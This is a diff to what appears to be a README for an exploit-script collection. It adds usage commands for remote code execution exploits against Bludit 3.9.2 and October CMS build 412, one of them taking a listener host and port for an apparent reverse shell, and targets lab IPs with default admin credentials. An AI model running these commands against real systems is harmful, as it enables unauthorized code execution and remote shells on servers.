@@ -18,7 +18,13 @@ python cve_2016_6515.py --target 10.10.6.13 --username root
 CVE-2019-16113 - Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname.
 
 ```bash
-python cve_2019_16113 --url 10.10.6.15 --username admin --password admin --cmd whoami
+python cve_2019_16113.py --url 10.10.6.15 --username admin --password admin --cmd whoami
+```
+
+CVE-2017-1000119 - October CMS build 412 is vulnerable to PHP code execution in the file upload functionality resulting in site compromise and possibly other applications on the server.
+
+```bash
+python cve_2017_1000119.py --url http://10.10.6.16 -user admin -pswd admin -lhost 10.10.14.16 -lport 4444
 ```
 
 **For Educational Purposes Only!!!**
